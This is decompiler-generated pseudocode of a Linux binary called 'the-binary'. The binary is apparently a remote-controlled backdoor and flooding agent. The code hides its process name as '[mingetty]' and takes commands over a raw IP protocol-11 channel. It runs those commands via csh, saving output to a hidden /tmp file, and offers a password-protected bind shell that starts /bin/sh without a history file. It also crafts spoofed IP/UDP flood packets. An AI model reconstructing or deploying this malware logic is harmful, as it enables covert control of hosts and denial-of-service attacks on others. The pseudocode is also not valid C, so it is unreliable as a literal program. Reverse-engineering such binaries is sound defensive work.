/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: 'the-binary'
 */


L08048080()
{



    return(L080675A8());
}

extern /* addr: 08048088 */  /*	Procedure: 0x08048088 - 0x0804808F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L08048088()

__entry_point__()
{
	/* unknown */ void  Vfffffff4;



    (restore)ecx;
    ebx = esp;
    eax = esp;
    eax = eax + ecx + ecx + ecx + ecx + 4;
    (save)0;
    (save)0;
    (save)0;
    ebp = esp;
    (save)eax;
    (save)ebx;
    (save)ecx;
    eax = 136;
    ebx = 0;
    // personality syscall
    asm("int 0x80");
    *L0806D228 = Vfffffff4;
    L0805756C( *L08078B18 & 65535);
    L08056D44();
    L08055F08(0x80675d0);
    L08048080();
    L08048134();
    (save)eax;
    some_sort_of_cleanup();
    // exit syscall
    for((restore)ebx; 1; asm("int 0x80");) {
        eax = 1;
    }
    goto L08048101;
}





L08048134()
{



    (save)ebp;
    ebp = esp;
    esp = esp - 17648;
    (save)edi;
    (save)esi;
    (save)ebx;
    ebx = *(ebp + 12);
    *(ebp + -17600) = 1;
    *(ebp + -17616) = ebp + -2048;
    *(ebp + -17620) = ebp + -2028;
    *(ebp + -17624) = ebp + -2026;
    *(ebp + -17604) = 16;
    if(geteuid() != 0) {
        (save)-1;
        some_sort_of_cleanup();
    }
    edx = *ebx;
    al = 0;
    edi = edx;
    asm("cld");
    ecx = -1;
    asm("repne scasb");
    (save) !ecx - 1;
    (save)0;
    (save)edx;
    L08057764();
    edx = *ebx;
    *edx = *"[mingetty]";
    *(edx + 4) = *"getty]";
    *(edx + 8) = *"y]";
    *(edx + 10) = *"";
    (save)1;
    (save)17;
    L080569BC();
    esp = esp + 20;
    if(fork() != 0) {
        (save)0;
        some_sort_of_cleanup();
    }
    setsid();
    (save)1;
    (save)17;
    L080569BC();
    esp = esp + 8;
    if(fork() != 0) {
        (save)0;
        some_sort_of_cleanup();
    }
    chdir("/");
    close(0);
    close(1);
    close(2);
    *L0807E774 = 0;
    *L0807E770 = 0;
    *L0807E778 = 0;
    time(0);
    esp = esp + 20;
    L080559A0(eax);
    socket(AF_INET, SOCK_RAW, NVP);
    *(ebp + -17608) = eax;
    (save)1;
    (save)1;
    L080569BC();
    (save)1;
    (save)15;
    L080569BC();
    (save)1;
    (save)17;
    L080569BC();
    esp = esp + 36;
    L080569BC(17, 1);
    *(ebp + -17632) = ebp + -4096;
    for(*(ebp + -17636) = ebp + -4536; 1; L080555B0(10000)) {
        esi = recv( *(ebp + -17608), ebp + -2048, 2048, 0);
        if(*( *(ebp + -17616) + 9) == 11 && *( *(ebp + -17620)) == 2 && esi > 200) {
            L0804A1E8(esi - 22, *(ebp + -17624), *(ebp + -17632));
            eax = ( *(ebp + -4095) & 255) - 1;
            if(eax <= 11) {
                goto *(eax * 4 + 0x804832c)[L0804835c, L080483f0, L08048590, L0804871c, L080487c8, L08048894, L08048acc, L08048b58, L08048b80, L08048c34, L08048d08, L08048de4, ]goto ( *(eax * 4 + 0x804832c));
                al = *L080675E5;
                *(ebp + -2048) = al;
                eax = *L0807E77C;
                *(ebp + -2048) = al;
                *(ebp + -2047) = 1;
                *(ebp + -2046) = 7;
                if(*L0807E774 == 0) {
L080483a0:
                    *(ebp + -2045) = 0;
                } else {
                    *(ebp + -2045) = 1;
                    *(ebp + -2044) = *L0807E778;
                }
                (save) *(ebp + -17632);
                (save)ebp + -2048;
                (save)400;
                L0804A194();
                L08056058();
                ecx = 201;
                asm("cdq");
                (save)ecx / ecx % ecx / ecx + 400;
                (save) *(ebp + -17632);
                (save) *(ebp + -17636);
                L08048ECC();
                esp = esp + 24;
            }
        }
L08048eb8:
    }
    goto L080483a0;
    *L0807E784 = *(ebp + -4094) & 255;
    *L0807E780 = *(ebp + -2032);
    *L0807E781 = *(ebp + -2031);
    *L0807E782 = *(ebp + -2030);
    *L0807E783 = *(ebp + -2029);
    time(0);
    L080559A0( *L0807E783);
    L08056058();
    ecx = 10;
    asm("cdq");
    edi = ecx / ecx % ecx / ecx;
    ebx = 0;
    esi = 0;
L08048454:
    if(ebx != edi) {
        if(*L0807E784 == 2) {
            al = *(ebp + ebx * 4 + -4093);
            edx = *(ebp + -17636);
            *(edx + esi) = al;
            *(esi + edx + 1) = *(ebp + ebx * 4 + -4092);
            *(esi + edx + 2) = *(ebp + ebx * 4 + -4091);
            al = *(ebp + ebx * 4 + -4090);
        } else {
            eax = L08056058();
            *(ebp + -17648) = eax;
            if(eax < 0) {
                *(ebp + -17648) = eax + 255;
            }
            *(esi + *(ebp + -17636)) = al;
            eax = L08056058();
            *(ebp + -17648) = eax;
            if(eax < 0) {
                *(ebp + -17648) = eax + 255;
            }
            *(esi + *(ebp + -17636) + 1) = al;
            eax = L08056058();
            *(ebp + -17648) = eax;
            if(eax < 0) {
                *(ebp + -17648) = eax + 255;
            }
            *(esi + *(ebp + -17636) + 2) = al;
            eax = L08056058();
            *(ebp + -17648) = eax;
            if(eax < 0) {
                *(ebp + -17648) = eax + 255;
            }
            edx = *(ebp + -17636);
        }
        *(esi + edx + 3) = al;
    }
    esi = esi + 4;
    ebx = ebx + 1;
    if(ebx <= 9) {
        goto L08048454;
    }
    eax = *L0807E784;
    if(eax == 0) {
        edi = 0;
    }
    if(eax == 2) {
        goto L08048eb8;
    }
    edi = edi << 2;
    *(ebp + -17644) = edi;
    al = *(ebp + -4093);
    ecx = *(ebp + -17636);
    *(edi + ecx) = al;
    al = *(ebp + -4092);
    edx = *(ebp + -17644);
    *(edx + ecx + 1) = al;
    *(edx + ecx + 2) = *(ebp + -4091);
    *(edx + ecx + 3) = *(ebp + -4090);
    goto L08048eb8;
    eax = fork();
    *L0807E770 = eax;
    if(*L0807E770 != 0) {
        goto L08048eb8;
    }
    setsid();
    (save)1;
    (save)17;
    L080569BC();
    esp = esp + 8;
    if(fork() != 0) {
        (save)10;
        L080556CC();
        kill(*L0807E770, 9);
        (save)0;
        some_sort_of_cleanup();
    }
    ebx = 0;
L080485dc:
    *(ebx + ebp + -4096) = *(ebx + ebp + -4094);
    ebx = ebx + 1;
    if(ebx <= 397) {
        goto L080485dc;
    }
    ebx = ebp + -2048;
    L0804F808();
    L080557E8();
    eax = L0804F620("/tmp/.hj237349", "rb", ebx, ebx, "/bin/csh -f -c \"%s\" 1> %s 2>&1", *(ebp + -17632), "/tmp/.hj237349");
    *(ebp + -17628) = eax;
    if(*(ebp + -17628) != 0) {
        edi = 0;
        *(ebp + -17640) = ebp + -4496;
L08048644:
        L0804F6D4(ebp + -2048, 1, 398, *(ebp + -17628));
        *(eax + ebp + -2048) = 0;
        ebx = 0;
L08048670:
        *(ebx + ebp + -4094) = *(ebx + ebp + -2048);
        ebx = ebx + 1;
        if(ebx <= 397) {
            goto L08048670;
        }
        if(edi == 0) {
            *(ebp + -4095) = 3;
            edi = 1;
        } else {
            *(ebp + -4095) = 4;
        }
        (save) *(ebp + -17640);
        (save) *(ebp + -17632);
        (save)400;
        L0804A194();
        L08056058();
        ecx = 201;
        asm("cdq");
        ebx = ecx / ecx % ecx / ecx;
        (save)ebx + 400;
        (save) *(ebp + -17640);
        (save) *(ebp + -17636);
        L08048ECC();
        (save)400000;
        L080555B0();
        esp = esp + 28;
        if(esi != 0) {
            goto L08048644;
        }
        L0804F540();
        unlink("/tmp/.hj237349", *(ebp + -17628));
    }
    exit(0);
    if(*L0807E774 != 0) {
        goto L08048eb8;
    }
    *L0807E778 = 4;
    eax = fork();
    *L0807E774 = eax;
    if(*L0807E774 != 0) {
        goto L08048eb8;
    }
    edi = ebp + -17596;
    esi = ebp + -4096;
    asm("cld");
    ecx = 63;
    asm("rep movsd");
    *edi = *esi;
    edi = edi + 4;
    *edi = *(esi + 4);
    edi = edi + 1;
    esi = esi + 1;
    ebx = 0;
L08048760:
    *(ebx + ebp + -17596) = *(ebx + ebp + -17587);
    ebx = ebx + 1;
    if(ebx <= 254) {
        goto L08048760;
    }
    L08049174( *(ebp + -4094) & 255, *(ebp + -4093) & 255, *(ebp + -4092) & 255, *(ebp + -4091) & 255, 0, *(ebp + -4090) & 255, *(ebp + -4089) & 255, *(ebp + -4088) & 255, ebp + -17596);
    exit(0);
    if(*L0807E774 != 0) {
        goto L08048eb8;
    }
    *L0807E778 = 5;
    eax = fork();
    *L0807E774 = eax;
    if(*L0807E774 != 0) {
        goto L08048eb8;
    }
    edi = ebp + -17596;
    esi = ebp + -4096;
    asm("cld");
    ecx = 63;
    asm("rep movsd");
    *edi = *esi;
    edi = edi + 4;
    *edi = *(esi + 4);
    edi = edi + 1;
    esi = esi + 1;
    ebx = 0;
L0804880c:
    *(ebx + ebp + -17596) = *(ebx + ebp + -17583);
    ebx = ebx + 1;
    if(ebx <= 254) {
        goto L0804880c;
    }
    L080499F4( *(ebp + -4094) & 255, *(ebp + -4093) & 255, *(ebp + -4092) & 255, *(ebp + -4091) & 255, *(ebp + -4090) & 255, *(ebp + -4089) & 255, *(ebp + -4088) & 255, *(ebp + -4087) & 255, *(ebp + -4086) & 255, *(ebp + -4085) & 255, *(ebp + -4084) & 255, ebp + -17596);
    exit(0);
    if(*L0807E774 != 0) {
        goto L08048eb8;
    }
    *L0807E778 = 6;
    (save)1;
    (save)17;
    L080569BC();
    eax = fork();
    *L0807E774 = eax;
    esp = esp + 8;
    if(*L0807E774 != 0) {
        goto L08048eb8;
    }
    setsid();
    L080569BC(17, 1);
    *(ebp + -4552) = 2;
    *(ebp + -4550) = 61786;
    *(ebp + -4548) = 0;
    *(ebp + -17600) = 1;
    *(ebp + -17608) = socket(AF_INET, SOCK_STREAM, IP);
    (save)1;
    (save)17;
    L080569BC();
    (save)1;
    (save)17;
    L080569BC();
    (save)1;
    (save)1;
    L080569BC();
    esp = esp + 36;
    L080569BC();
    L080569BC();
    setsockopt( *(ebp + -17608), 1, 2, ebp + -17600, 4, 2, 1, 15, 1);
    bind();
    listen( *(ebp + -17608), 3, *(ebp + -17608), ebp + -4552, 16);
L08048984:
    eax = accept( *(ebp + -17608), ebp + -4568, ebp + -17604);
    *(ebp + -17612) = eax;
    if(*(ebp + -17612) != 0) {
        if(fork() != 0) {
            goto L08048984;
        }
        recv( *(ebp + -17612), ebp + -17340, 19, 0);
        ebx = 0;
L080489d4:
        al = *(ebx + ebp + -17340);
        if(al == 10 || al == 13) {
            *(ebx + ebp + -17340) = 0;
        } else {
            *(ebx + ebp + -17340) = al;
            *(ebx + ebp + -17340) = *(ebx + ebp + -17340) + 1;
        }
        ebx = ebx + 1;
        if(ebx <= 18) {
            goto L080489d4;
        }
        edi = "TfOjG";
        ecx = 6;
        asm("cld");
        asm("repe cmpsb");
        if(!(esi = ebp + -17340)) {
            send(*(ebp + -17612), 0x806761d, 4, 0);
            (save) *(ebp + -17612);
            close(*(ebp + -17612));
            (save)1;
            some_sort_of_cleanup();
        }
        dup2();
        dup2();
        dup2();
        L0804A2A8("PATH", "/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin/:.", 1, *(ebp + -17612), 2, *(ebp + -17612), 1, *(ebp + -17612), 0);
        (save)"HISTFILE";
        L0804A48C();
        (save)1;
        (save)"linux";
        (save)"TERM";
        L0804A2A8();
        (save)0;
        (save)"sh";
        (save)"/bin/sh";
        L080555FC();
        close(*(ebp + -17612));
        esp = esp + 32;
        (save)0;
        some_sort_of_cleanup();
    }
    (save)0;
    some_sort_of_cleanup();
    eax = fork();
    *L0807E770 = eax;
    if(*L0807E770 != 0) {
        goto L08048eb8;
    }
    setsid();
    (save)1;
    (save)17;
    L080569BC();
    esp = esp + 8;
    if(fork() != 0) {
        (save)1200;
        L080556CC();
        kill(*L0807E770, 9);
        (save)0;
        some_sort_of_cleanup();
    }
    ebx = 0;
L08048b1c:
    *(ebx + ebp + -4096) = *(ebx + ebp + -4094);
    ebx = ebx + 1;
    if(ebx <= 397) {
        goto L08048b1c;
    }
    (save) *(ebp + -17632);
    (save)"/bin/csh -f -c \"%s\" ";
    ebx = ebp + -2048;
    (save)ebx;
    L0804F808();
    (save)ebx;
    L080557E8();
    exit(0);
    eax = *L0807E774;
    if(eax == 0) {
        goto L08048eb8;
    }
    kill(eax, 9);
    *L0807E774 = 0;
    goto L08048eb8;
    if(*L0807E774 != 0) {
        goto L08048eb8;
    }
    *L0807E778 = 9;
    eax = fork();
    *L0807E774 = eax;
    if(*L0807E774 != 0) {
        goto L08048eb8;
    }
    edi = ebp + -17596;
    esi = ebp + -4096;
    asm("cld");
    ecx = 63;
    asm("rep movsd");
    *edi = *esi;
    edi = edi + 4;
    *edi = *(esi + 4);
    edi = edi + 1;
    esi = esi + 1;
    ebx = 0;
L08048bc4:
    *(ebx + ebp + -17596) = *(ebx + ebp + -17586);
    ebx = ebx + 1;
    if(ebx <= 254) {
        goto L08048bc4;
    }
    L08049174( *(ebp + -4094) & 255, *(ebp + -4093) & 255, *(ebp + -4092) & 255, *(ebp + -4091) & 255, *(ebp + -4090) & 255, *(ebp + -4089) & 255, *(ebp + -4088) & 255, *(ebp + -4087) & 255, ebp + -17596);
    exit(0);
    if(*L0807E774 != 0) {
        goto L08048eb8;
    }
    *L0807E778 = 10;
    eax = fork();
    *L0807E774 = eax;
    if(*L0807E774 != 0) {
        goto L08048eb8;
    }
    edi = ebp + -17596;
    esi = ebp + -4096;
    asm("cld");
    ecx = 63;
    asm("rep movsd");
    *edi = *esi;
    edi = edi + 4;
    *edi = *(esi + 4);
    edi = edi + 1;
    esi = esi + 1;
    ebx = 0;
L08048c78:
    *(ebx + ebp + -17596) = *(ebx + ebp + -17582);
    ebx = ebx + 1;
    if(ebx <= 254) {
        goto L08048c78;
    }
    L08049D40( *(ebp + -4094) & 255, *(ebp + -4093) & 255, *(ebp + -4092) & 255, *(ebp + -4091) & 255, *(ebp + -4090) & 255, *(ebp + -4089) & 255, *(ebp + -4088) & 255, *(ebp + -4087) & 255, *(ebp + -4086) & 255, *(ebp + -4085) & 255, *(ebp + -4084) & 255, 0, *(ebp + -4083) & 255, ebp + -17596);
    exit(0);
    if(*L0807E774 != 0) {
        goto L08048eb8;
    }
    *L0807E778 = 11;
    eax = fork();
    *L0807E774 = eax;
    if(*L0807E774 != 0) {
        goto L08048eb8;
    }
    edi = ebp + -17596;
    esi = ebp + -4096;
    asm("cld");
    ecx = 63;
    asm("rep movsd");
    *edi = *esi;
    edi = edi + 4;
    *edi = *(esi + 4);
    edi = edi + 1;
    esi = esi + 1;
    ebx = 0;
L08048d4c:
    *(ebx + ebp + -17596) = *(ebx + ebp + -17581);
    ebx = ebx + 1;
    if(ebx <= 254) {
        goto L08048d4c;
    }
    L08049D40( *(ebp + -4094) & 255, *(ebp + -4093) & 255, *(ebp + -4092) & 255, *(ebp + -4091) & 255, *(ebp + -4090) & 255, *(ebp + -4089) & 255, *(ebp + -4088) & 255, *(ebp + -4087) & 255, *(ebp + -4086) & 255, *(ebp + -4085) & 255, *(ebp + -4084) & 255, *(ebp + -4083) & 255, *(ebp + -4082) & 255, ebp + -17596);
    exit(0);
    if(*L0807E774 != 0) {
        goto L08048eb8;
    }
    *L0807E778 = 12;
    eax = fork();
    *L0807E774 = eax;
    if(*L0807E774 != 0) {
        goto L08048eb8;
    }
    edi = ebp + -17596;
    esi = ebp + -4096;
    asm("cld");
    ecx = 63;
    asm("rep movsd");
    *edi = *esi;
    edi = edi + 4;
    *edi = *(esi + 4);
    edi = edi + 1;
    esi = esi + 1;
    ebx = 0;
L08048e28:
    *(ebx + ebp + -17596) = *(ebx + ebp + -17582);
    ebx = ebx + 1;
    if(ebx <= 254) {
        goto L08048e28;
    }
    L08049564( *(ebp + -4094) & 255, *(ebp + -4093) & 255, *(ebp + -4092) & 255, *(ebp + -4091) & 255, *(ebp + -4090) & 255, *(ebp + -4089) & 255, *(ebp + -4088) & 255, *(ebp + -4087) & 255, *(ebp + -4086) & 255, *(ebp + -4085) & 255, *(ebp + -4084) & 255, *(ebp + -4083) & 255, ebp + -17596);
    exit(0);
    goto L08048eb8;
}


L08048ECC(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;



    if(*L0807E784 != 0) {
        esi = A8 + 36;
        do {
            L080555B0();
            L08048F94(0x807e780, ebx, Ac, A10, 4000);
            ebx = ebx + 4;
        } while(ebx <= esi);
    } else {
        L08048F94(0x807e780, A8, Ac, A10);
    }
    return(1);
}




L08048F94(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vffffffbc;
	/* unknown */ void  Vffffffc0;
	/* unknown */ void  Vffffffc4;
	/* unknown */ void  Vffffffc8;
	/* unknown */ void  Vffffffce;
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff2;
	/* unknown */ void  Vfffffff4;



    ebx = Ac;
    eax = socket(AF_INET, SOCK_RAW, RAW);
    Vffffffbc = eax;
    if(Vffffffbc != -1) {
        esi = L0805BD74(A14 + 23);
        if(esi != 0) {
            goto L08048fd8;
        }
    }
    eax = 0;
    goto L0804912c;
L08048fd8:
    Vffffffc4 = esi;
    Vffffffc0 = esi + 20;
    Vffffffc8 = esi + 22;
    *(esi + 12) = *A8;
    *(esi + 13) = *(A8 + 1);
    *(esi + 14) = *(A8 + 2);
    *(esi + 15) = *(A8 + 3);
    *(esi + 16) = *ebx;
    *(esi + 17) = *(ebx + 1);
    *(esi + 18) = *(ebx + 2);
    *(esi + 19) = *(ebx + 3);
    ebx = & Vffffffd0;
    L0804F808();
    Vfffffff4 = L08049138(ebx, ebx, "%d.%d.%d.%d", *ebx & 255, *(ebx + 1) & 255, *(ebx + 2) & 255, *(ebx + 3) & 255);
    Vfffffff2 = 10;
    Vfffffff0 = 2;
    *esi = 69;
    *(esi + 8) = 250;
    *(esi + 9) = 11;
    ax = A14 + 22;
    asm("xchg al,ah");
    *(esi + 2) = ax;
    *(esi + 1) = 0;
    L08056058();
    asm("xchg al,ah");
    *(esi + 4) = ax;
    *(esi + 6) = 0;
    *(esi + 10) = 0;
    edx = 20;
    ecx = esi;
    ebx = 0;
    Vffffffce = 0;
    do {
        ebx = ebx + ( *ecx & 65535);
        ecx = ecx + 2;
        edx = edx + -2;
    } while(edx > 1);
    != ? 0x80490b1 : ;
    Vffffffce = *ecx;
    ebx = ebx + (Vffffffce & 65535);
    edx = ebx >> 16;
    ebx = (bx & 65535) + edx;
    ax = !(ebx + (ebx >> 16));
    Vffffffce = ax;
    *(Vffffffc4 + 10) = Vffffffce;
    *Vffffffc0 = 3;
    L0805652C(Vffffffc8, A10, A14);
    if(sendto(Vffffffbc, esi, A14 + 22, 0, & Vfffffff0, 16) == -1) {
        (save)esi;
        L0805C290();
        eax = 0;
    } else {
        close();
        L0805C290(esi, Vffffffbc);
        eax = 1;
    }
L0804912c:
    esp = ebp - 80;
}



L08049138(A8)
/* unknown */ void  A8;
{



    ecx = L0804BF80(A8);
    if(ecx != 0) {
        edx = *( *(ecx + 16));
        L0805652C(0x80792bc, edx, *(ecx + 12));
        return(*L080792BC);
    }
    esp = ebp;
    return(0);
}



L08049174(A8, Ac, A10, A14, A18, A1c, A20, A24, A28)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
/* unknown */ void  A20;
/* unknown */ void  A24;
/* unknown */ void  A28;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffff98c;
	/* unknown */ void  Vfffff990;
	/* unknown */ void  Vfffff994;
	/* unknown */ void  Vfffff998;
	/* unknown */ void  Vfffff99c;
	/* unknown */ void  Vfffff9a0;
	/* unknown */ void  Vfffff9a4;
	/* unknown */ void  Vfffff9a8;
	/* unknown */ void  Vfffff9ac;
	/* unknown */ void  Vfffff9b0;
	/* unknown */ void  Vfffff9b4;
	/* unknown */ void  Vfffff9b8;
	/* unknown */ void  Vfffff9bc;
	/* unknown */ void  Vfffff9c2;
	/* unknown */ void  Vfffff9c4;
	/* unknown */ void  Vfffff9c8;
	/* unknown */ void  Vfffff9d4;
	/* unknown */ void  Vfffff9d5;
	/* unknown */ void  Vfffff9d6;
	/* unknown */ void  Vfffff9d7;
	/* unknown */ void  Vfffff9dc;
	/* unknown */ void  Vfffff9e4;
	/* unknown */ void  Vfffffdd8;
	/* unknown */ void  Vfffffdda;
	/* unknown */ void  Vfffffddc;
	/* unknown */ void  Vfffffde8;
	/* unknown */ void  Vffffffdc;



    Vfffff9bc = A8;
    Vfffff9b8 = Ac;
    Vfffff9b4 = A10;
    Vfffff9b0 = A14;
    edi = & Vffffffdc;
    esi = 0x8067698;
    asm("cld");
    ecx = 9;
    asm("rep movsd");
    Vfffff9ac = 1;
    edi = & Vfffffde8;
    esi = 0x80676bc;
    asm("cld");
    ecx = 125;
    asm("rep movsd");
    esi = & Vfffff9c8;
    Vfffff9a4 = & Vfffff9dc;
    Vfffff9a0 = & Vfffff9e4;
    Vfffffdd8 = 2;
    Vfffffdda = 0;
    if(A18 != 0) {
        A18 = A18 - 1;
    }
    eax = socket(AF_INET, SOCK_RAW, RAW);
    Vfffff9a8 = eax;
    if(Vfffff9a8 > 0) {
        Vfffff99c = 0;
        Vfffff998 = 0;
        L08057764(esi, 0, 1024);
        while(1) {
            edi = 0;
            if(A24 != 0 && Vfffff998 <= 0) {
                edx = L0804BF80(A28);
                if(edx != 0) {
L08049288:
                    L08056480( *( *(edx + 16)), & Vfffff9c4, 4);
                    *(esi + 12) = Vfffff9c4;
                    Vfffff998 = 40000;
                } else {
                    L080556CC(600);
                    edi = 1;
                }
            }
            if(edi != 0) {
                continue;
            }
            edi = 0;
            Vfffff990 = 0;
            do {
                if(Vfffff9ac != 1) {
                    edx = 0;
                } else {
                    Vfffff9ac = 0;
                    L08055E38();
                    ebx = 8000;
                    asm("cdq");
                    edx = ebx / ebx % ebx / ebx;
                }
                if(*(edx * 4 + 0x806d22c) != 0) {
                    Vfffff994 = edx * 4 + 0x806d22c;
                    do {
                        Vfffffddc = *Vfffff994;
                        edx = ebp + Vfffff990 + -536;
                        L0805652C(Vfffff9a0, edx, *(ebp + edi * 4 - 36));
                        L08055E38();
                        ebx = 255;
                        asm("cdq");
                        edx = ebx / ebx % ebx / ebx;
                        *Vfffff9a0 = dl;
                        L08055E38();
                        ebx = 255;
                        asm("cdq");
                        edx = ebx / ebx % ebx / ebx;
                        *(Vfffff9a0 + 1) = dl;
                        if(A1c != 0 || A20 != 0) {
                            ax = (A1c << 8) + A20;
                        } else {
                            L08055E38();
                            ebx = 30000;
                            asm("cdq");
                            edx = ebx / ebx % ebx / ebx;
                            eax = edx;
                        }
                        asm("xchg al,ah");
                        *Vfffff9a4 = ax;
                        ebx = Vfffff9a4;
                        *(ebx + 2) = 13568;
                        ax = *(ebp + edi * 4 - 36) + 8;
                        asm("xchg al,ah");
                        *(ebx + 4) = ax;
                        *(ebx + 6) = 0;
                        if(A24 == 0) {
                            Vfffff9d4 = Vfffff9bc;
                            Vfffff9d5 = Vfffff9b8;
                            Vfffff9d6 = Vfffff9b4;
                            Vfffff9d7 = Vfffff9b0;
                        }
                        *(esi + 16) = *Vfffff994;
                        *esi = 69;
                        L08055E38();
                        ebx = 130;
                        asm("cdq");
                        *(esi + 8) = ebx / ebx % ebx / ebx + 120;
                        L08055E38();
                        ebx = 255;
                        asm("cdq");
                        *(esi + 4) = ebx / ebx % ebx / ebx;
                        *(esi + 9) = 17;
                        *(esi + 6) = 0;
                        ax = *(ebp + edi * 4 - 36) + 28;
                        asm("xchg al,ah");
                        *(esi + 2) = ax;
                        *(esi + 10) = 0;
                        edx = 20;
                        Vfffff98c = & Vfffff9c8;
                        ecx = 0;
                        Vfffff9c2 = 0;
                        do {
                            ebx = Vfffff98c;
                            ecx = ecx + ( *ebx & 65535);
                            ebx = ebx + 2;
                            Vfffff98c = ebx;
                            edx = edx + -2;
                        } while(edx > 1);
                        != ? 0x804948b : ;
                        Vfffff9c2 = *ebx;
                        ecx = ecx + (Vfffff9c2 & 65535);
                        edx = ecx >> 16;
                        ecx = (cx & 65535) + edx;
                        ax = !(ecx + (ecx >> 16));
                        Vfffff9c2 = ax;
                        *(esi + 10) = Vfffff9c2;
                        sendto(Vfffff9a8, & Vfffff9c8, *(ebp + edi * 4 - 36) + 28, 0, & Vfffffdd8, 16);
                        if(A18 != 0) {
                            if(Vfffff99c != A18) {
                                Vfffff99c = Vfffff99c + 1;
                                goto L0804951a;
                            }
                            L080555B0(300);
                            Vfffff99c = 0;
                        } else {
                            (save)300;
                            L080555B0();
                        }
                        Vfffff998 = Vfffff998 - 1;
L0804951a:
                        Vfffff994 = Vfffff994 + 4;
                    } while(*Vfffff994 != 0);
                }
                Vfffff990 = Vfffff990 + 50;
                edi = edi + 1;
            } while(edi <= 8);
        }
        goto L08049288;
    }
    *L0807E774 = 0;
    esp = ebp + -1664;
    return(0);
}



L08049564(A8, Ac, A10, A14, A18, A1c, A20, A24, A28, A2c, A30, A34, A38)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
/* unknown */ void  A20;
/* unknown */ void  A24;
/* unknown */ void  A28;
/* unknown */ void  A2c;
/* unknown */ void  A30;
/* unknown */ void  A34;
/* unknown */ void  A38;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffff974;
	/* unknown */ void  Vfffff978;
	/* unknown */ void  Vfffff97c;
	/* unknown */ void  Vfffff980;
	/* unknown */ void  Vfffff984;
	/* unknown */ void  Vfffff988;
	/* unknown */ void  Vfffff98c;
	/* unknown */ void  Vfffff990;
	/* unknown */ void  Vfffff994;
	/* unknown */ void  Vfffff998;
	/* unknown */ void  Vfffff99c;
	/* unknown */ void  Vfffff9a0;
	/* unknown */ void  Vfffff9a4;
	/* unknown */ void  Vfffff9a8;
	/* unknown */ void  Vfffff9ac;
	/* unknown */ void  Vfffff9b2;
	/* unknown */ void  Vfffff9b4;
	/* unknown */ void  Vfffff9b8;
	/* unknown */ void  Vfffff9d8;
	/* unknown */ void  Vfffff9e4;
	/* unknown */ void  Vfffff9e5;
	/* unknown */ void  Vfffff9e6;
	/* unknown */ void  Vfffff9e7;
	/* unknown */ void  Vfffff9e8;
	/* unknown */ void  Vfffff9e9;
	/* unknown */ void  Vfffff9ea;
	/* unknown */ void  Vfffff9eb;
	/* unknown */ void  Vfffff9ec;
	/* unknown */ void  Vfffff9f4;
	/* unknown */ void  Vfffffdd8;
	/* unknown */ void  Vfffffdda;
	/* unknown */ void  Vfffffddc;
	/* unknown */ void  Vfffffde8;
	/* unknown */ void  Vffffffdc;



    Vfffff9ac = A8;
    Vfffff9a8 = Ac;
    Vfffff9a4 = A10;
    Vfffff9a0 = A14;
    Vfffff99c = A18;
    Vfffff998 = A1c;
    Vfffff994 = A20;
    Vfffff990 = A24;
    edi = & Vffffffdc;
    esi = 0x8067698;
    asm("cld");
    ecx = 9;
    asm("rep movsd");
    edi = & Vfffffde8;
    esi = 0x80676bc;
    asm("cld");
    ecx = 125;
    asm("rep movsd");
    edi = & Vfffff9d8;
    Vfffff988 = & Vfffff9ec;
    Vfffff984 = & Vfffff9f4;
    Vfffffdd8 = 2;
    Vfffffdda = 0;
    if(A34 == 0) {
        L0804F808( & Vfffff9b8, "%d.%d.%d.%d", Vfffff9ac & 255, Vfffff9a8 & 255, Vfffff9a4 & 255, Vfffff9a0 & 255);
    }
    if(A28 != 0) {
        A28 = A28 - 1;
    }
    eax = socket(AF_INET, SOCK_RAW, RAW);
    Vfffff98c = eax;
    if(Vfffff98c > 0) {
        Vfffff980 = 0;
        Vfffff97c = 0;
        L08057764(edi, 0, 1024);
        while(1) {
            esi = 0;
            if(A34 != 0 && Vfffff97c <= 0) {
                edx = L0804BF80(A38);
                if(edx != 0) {
L080496cc:
                    L08056480( *( *(edx + 16)), & Vfffff9b4, 4);
                    eax = Vfffff9b4;
                    *(edi + 16) = eax;
                    Vfffffddc = *(edi + 16);
                    Vfffff97c = 40000;
                } else {
                    L080556CC(600);
                    esi = 1;
                }
            }
            if(esi != 0) {
                continue;
            }
            esi = 0;
            Vfffff978 = ebp;
            do {
                if(A34 == 0) {
                    Vfffffddc = L0804CE8C( & Vfffff9b8);
                }
                L0805652C(Vfffff984, Vfffff978 + -536, *(ebp + esi * 4 - 36));
                L08055E38();
                ebx = 255;
                asm("cdq");
                edx = ebx / ebx % ebx / ebx;
                *Vfffff984 = dl;
                L08055E38();
                ebx = 255;
                asm("cdq");
                edx = ebx / ebx % ebx / ebx;
                *(Vfffff984 + 1) = dl;
                if(A2c != 0 || A30 != 0) {
                    ax = (A2c << 8) + A30;
                } else {
                    L08055E38();
                    ebx = 30000;
                    asm("cdq");
                    eax = ebx / ebx % ebx / ebx;
                }
                asm("xchg al,ah");
                *Vfffff988 = ax;
                ebx = Vfffff988;
                *(ebx + 2) = 13568;
                ax = *(ebp + esi * 4 - 36) + 8;
                asm("xchg al,ah");
                *(ebx + 4) = ax;
                *(ebx + 6) = 0;
                if(Vfffff99c != 0 || Vfffff998 != 0 || Vfffff994 != 0 || Vfffff990 != 0) {
                    Vfffff9e4 = Vfffff99c;
                    Vfffff9e5 = Vfffff998;
                    Vfffff9e6 = Vfffff994;
                    Vfffff9e7 = Vfffff990;
                } else {
                    L08055E38();
